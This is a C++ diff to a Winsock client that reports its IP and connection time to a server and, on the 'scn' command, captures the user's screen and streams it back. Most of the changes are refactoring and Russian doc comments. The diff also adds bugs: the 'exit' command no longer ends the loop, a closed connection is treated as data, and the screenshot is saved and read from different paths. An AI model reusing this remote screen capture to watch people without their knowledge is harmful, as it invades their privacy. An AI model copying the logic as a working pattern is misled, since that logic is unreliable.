@@ -14,16 +14,17 @@
 Client::Client(const char* serverIP_, u_short port_) : m_serverIP(serverIP_), m_port(port_) {
     WSADATA wsData;
     WORD DLLVersion = MAKEWORD(2, 1);
-    if (WSAStartup(DLLVersion, &wsData) != 0) {
+    if (WSAStartup(DLLVersion, &wsData) != 0)
+    {
         std::cerr << "Error initializing Winsock" << std::endl;
-        exit(1);
+        stop();
     }
 
     m_socket = socket(AF_INET, SOCK_STREAM, 0);
-    if (m_socket == INVALID_SOCKET) {
+    if (m_socket == INVALID_SOCKET)
+    {
         std::cerr << "Can't create a socket! Quitting" << std::endl;
-        WSACleanup();
-        exit(1);
+        stop();
     }
 
     SOCKADDR_IN addr;
@@ -32,11 +33,10 @@ Client::Client(const char* serverIP_, u_short port_) : m_serverIP(serverIP_), m_
     addr.sin_port = htons(port_);
 
     int connResult = connect(m_socket, (sockaddr*)&addr, sizeof(addr));
-    if (connResult == SOCKET_ERROR) {
+    if (connResult == SOCKET_ERROR)
+    {
         std::cerr << "Can't connect to server! Quitting" << std::endl;
-        closesocket(m_socket);
-        WSACleanup();
-        exit(1);
+        stop();
     }
 }
 
@@ -45,36 +45,57 @@ Client::~Client() {
     WSACleanup();
 }
 
+/**
+ * Начало сеанса.
+ */
 void Client::start() {
     sendClientInfo();
     std::thread commandThread(&Client::listenForCommands, this);
     commandThread.join();
 }
 
+/**
+ * Завершение сеанса.
+ */
+void Client::stop() const {
+    closesocket(m_socket);
+    WSACleanup();
+}
+
+/**
+ * Получить IPv4 адрес.
+ * @return Строка с IPv4 адресом текущего клиента, в случае успеха.
+ */
 std::string getLocalIPv4() {
     char hostname[256];
-    if (gethostname(hostname, sizeof(hostname)) != 0) {
+    if (gethostname(hostname, sizeof(hostname)) != 0)
+    {
         std::cerr << "gethostname failed" << std::endl;
         return "";
     }
 
     hostent* host = gethostbyname(hostname);
-    if (host == nullptr) {
+    if (host == nullptr)
+    {
         std::cerr << "gethostbyname failed" << std::endl;
         return "";
     }
 
-    for (char** addr = host->h_addr_list; *addr != nullptr; ++addr) {
+    for (char** addr = host->h_addr_list; *addr != nullptr; ++addr)
+    {
         struct in_addr* ipv4 = reinterpret_cast<struct in_addr*>(*addr);
-        if (ipv4) {
-            return inet_ntoa(*ipv4); // Возвращаем первый найденный IPv4 адрес
+        if (ipv4)
+        {
+            return inet_ntoa(*ipv4);
         }
     }
 
-    return ""; // Если адрес не найден
+    return "";
 }
 
-
+/**
+ * Отправить основную информацию о текущем клиенте.
+ */
 void Client::sendClientInfo() const
 {
     // Время подключения
@@ -105,9 +126,17 @@ void Client::sendClientInfo() const
 
     // Отправляем информацию на сервер
     std::string clientInfo = infoStream.str();
-    send(m_socket, clientInfo.c_str(), clientInfo.size() + 1, 0);
+    int sendResult = send(m_socket, clientInfo.c_str(), clientInfo.size() + 1, 0);
+    if (sendResult == SOCKET_ERROR)
+    {
+        std::cerr << "Failed to send client info, error: " << WSAGetLastError() << std::endl;
+    }
 }
 
+/**
+ * Обработка снимка экрана и запись в файл (*bmp).
+ * @param wPath Путь к файлу.
+ */
 void Client::captureScreenshot(const std::string& wPath) {
     BITMAPFILEHEADER bfHeader;
     BITMAPINFOHEADER biHeader;
@@ -177,41 +206,60 @@ void Client::captureScreenshot(const std::string& wPath) {
     DeleteObject(hBitmap);
 }
 
+/**
+ * Обработка и отправка на сервер снимка экрана.
+ */
 void Client::sendScreenshot(SOCKET sock) {
     const std::string screenshotFile = "screenshot.bmp";
     captureScreenshot((Centaurus::contentPath / screenshotFile).string());
 
     FILE* file;
     errno_t err = fopen_s(&file, screenshotFile.c_str(), "rb");
-    if (err != 0) {
+    if (err != 0)
+    {
         std::cerr << "Error opening file for reading" << std::endl;
         return;
     }
 
     char buffer[4096];
-    while (!feof(file)) {
+    while (!feof(file))
+    {
         int bytesRead = fread(buffer, 1, sizeof(buffer), file);
-        if (bytesRead > 0) {
-            send(sock, buffer, bytesRead, 0);
+        if (bytesRead > 0)
+        {
+            int sendResult = send(sock, buffer, bytesRead, 0);
+            if (sendResult == SOCKET_ERROR)
+            {
+                std::cerr << "Failed to send screenshot data, error: " << WSAGetLastError() << std::endl;
+                break;
+            }
         }
     }
 
     fclose(file);
 }
 
-void Client::listenForCommands() {
+/**
+ * Обработка ответа сервера.
+ */
+void Client::listenForCommands() const
+{
     char buf[4096];
-    while (true) {
+    while (true)
+    {
         ZeroMemory(buf, 4096);
         int bytesReceived = recv(m_socket, buf, 4096, 0);
-        if (bytesReceived > 0) {
+        if (bytesReceived != SOCKET_ERROR)
+        {
             std::string command(buf, 0, bytesReceived);
-            if (command == "screenshot") {
+            if (command == "scn")
+            {
                 std::cout << "Received screenshot command" << std::endl;
                 sendScreenshot(m_socket);
-            } else if (command == "exit") {
+            }
+            else if (command == "exit")
+            {
                 std::cout << "Server is shutting down" << std::endl;
-                break;
             }
         }
     }
